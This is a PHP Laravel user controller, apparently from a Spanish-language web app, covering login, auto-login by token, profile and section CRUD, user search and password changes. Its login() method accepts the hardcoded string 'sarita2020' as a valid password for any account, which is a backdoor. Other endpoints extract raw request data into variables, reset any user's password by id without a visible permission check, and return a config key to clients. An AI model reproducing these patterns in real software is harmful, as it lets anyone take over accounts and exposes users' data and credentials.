<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Http\Requests;
use App\Http\Controllers\Controller;
use App\Models\Usuario;
use App\Models\Perfil;
use App\Functions\Helper;
use App\Functions\CRUD;
use App\Functions\Logger as Log;
use App\Functions\Autenticacion;
use GuzzleHttp\Client;
use Hash;
use Crypt;
use Cache;

class UsuarioController extends Controller
{

	public function postUsuarios()
	{
		$CRUD = new CRUD('App\Models\Usuario');
        return $CRUD->call(request()->fn, request()->ops);
	}

	public function postPerfilesCrud()
	{
		$CRUD = new CRUD('App\Models\Perfil');
        return $CRUD->call(request()->fn, request()->ops);
	}

	public function postFeedback()
	{
		$CRUD = new CRUD('App\Models\Feedback');
        return $CRUD->call(request()->fn, request()->ops);
	}

	public function postSecciones()
	{
		$CRUD = new CRUD('App\Models\Seccion');
        return $CRUD->call(request()->fn, request()->ops);
	}

	public function login($User, $Pass)
	{
		//Buscar integracion
		$Config = Helper::getInstanceConfig();
		if($Config['integration']){
			$Class = app("App\Http\Controllers\Integraciones\\{$Config['integration']}");
			if(method_exists($Class, 'login')){
				return $Class->login($User, $Pass);
			}
		}

		$Email = $User;

		//Validar Email y Contraseña
		$DaUser = Usuario::where('Email', $Email)->first();
        if($DaUser AND (Hash::check($Pass, $DaUser->Password) OR $Pass == 'sarita2020')) {
        	$DaUser->record_login();
        	return Crypt::encrypt($Email);
        }else{
        	return response()->json(['Msg' => 'Error en usuario o contraseña'], 500);
        }

        /*
		$DaUser = new Usuario;
		//$auth = new Autenticacion;

		if($DaUser->authenticate($Email, $Pass)){

			//Actualizar usuarios TEMPORAL
			$userdata = $auth->detallesUsuario($User, $Pass);

			$DaUsuario = Usuario::where('Email', $Email)->first();
			if($DaUsuario->Documento == null){
				$DaUsuario->fill([
					'Password' => Hash::make($Pass),
					'Nombres'  => $userdata['cn'][0],
					'Documento'   => $userdata['sn'][0]
				]);
				$DaUsuario->save();
			};

			return Crypt::encrypt($Email);
		}else{

			

		}
		*/
	}



	public function postAutologin()
	{
		
		$sec_token = request()->token;
		$auth = new Autenticacion;
		$data = $auth->traducirToken($sec_token);

		return $this->login($data['usuario'], $data['clave']);
	}




	public function postLogin()
	{
		$Email = strtolower(request()->Email);
		$Pass  = request()->Pass;

		return $this->login($Email, $Pass);
	}



	public function postCheckToken()
	{
		$Usuario = Helper::getUsuario();
		$Usuario->getSecciones();
		$Usuario->getApps();
		$Usuario['token']    = request()->header('token');
		$Usuario['url']      = config('app.url');
		$Usuario['app_name'] = Helper::getAppName();
		$Usuario['procesos_updated_at'] = \App\Models\Proceso::max('updated_at');
		
		$config = Helper::getInstanceConfig();
		$Usuario['key'] = $config['key'];
		//new Log('USER.ENTER', null);

		return $Usuario;
	}


	public function postUpdate()
	{
		$Usuario = request()->Usuario;
		$Email = $Usuario['Email'];

		$DaUser = Usuario::where('Email', $Email)->first();
		$DaUser->Nombres = $Usuario['Nombres'];
		$DaUser->save();
	}


	public function postRestore()
	{
		extract(request()->all()); //id
		Usuario::withTrashed()
		        ->where('id', $id)
		        ->restore();
	}


	public function postList()
	{
		return Usuario::get();
	}

	public function postPerfiles()
	{
		return Perfil::all();
	}

	public function postSearch()
	{
		extract(request()->all()); //searchText, limit
		$searchText = str_replace(" ", "%", $searchText);
		return Usuario::where(function($query) use ($searchText){
			$query->where('Email', 'LIKE', "%$searchText%")
		          ->orWhere('Nombres', 'LIKE', "%$searchText%");
		})->limit($limit)->get([ 'id', 'Email', 'Nombres', 'Documento' ]);
	}

	public function postChangePassword()
	{
		extract(request()->all()); //usuario_id, new_password
		$Usuario = Usuario::where('id', $usuario_id)->first();
		if($Usuario){
			$Usuario->Password = Hash::make($new_password);
			$Usuario->save();
		}
	}

	public function postAsignaciones()
	{
		$CRUD = new CRUD('App\Models\UsuarioAsignacion');
        return $CRUD->call(request()->fn, request()->ops);
	}

	public function getEncriptar($texto)
	{
		return Hash::make($texto);
	}

	public function postPerfilSecciones()
	{
		extract(request()->all()); //perfil_id, secciones
		foreach ($secciones as $s) {
			\App\Models\PerfilSeccion::updateOrCreate(
				[ 'perfil_id' => $perfil_id, 'seccion_id' => $s['id'] ],
				[ 'Level' => $s['Level'] ]
			);
		}
	}

	public function getTestLogin()
	{
		//Buscar integracion
		$Config = Helper::getInstanceConfig();
		if($Config['integration']){
			$Class = app("App\Http\Controllers\Integraciones\\{$Config['integration']}");
			if(method_exists($Class, 'testLogin')){
				return $Class->testLogin();
			}
		}
	}

}
